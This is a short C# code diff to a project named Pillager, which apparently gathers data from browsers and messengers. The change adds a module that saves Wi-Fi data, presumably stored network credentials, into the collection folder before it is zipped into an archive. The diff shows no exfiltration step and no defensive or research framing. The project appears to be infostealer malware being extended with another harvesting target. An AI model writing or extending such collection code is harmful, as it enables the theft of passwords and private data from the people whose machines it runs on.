@@ -4,6 +4,7 @@ using System.IO;
 using System.IO.Compression;
 using Pillager.Browsers;
 using Pillager.Messengers;
+using Pillager.Others;
 using Pillager.Tools;
 
 namespace Pillager
@@ -50,6 +51,9 @@ namespace Pillager
                 Chrome chrome = new Chrome(browser[0], chromepath);
                 chrome.Save(savepath);                
             }
+
+            //Others
+            Wifi.Save(savepath);
 
             //ZIP
             ZipFile.CreateFromDirectory(savepath, savezippath);
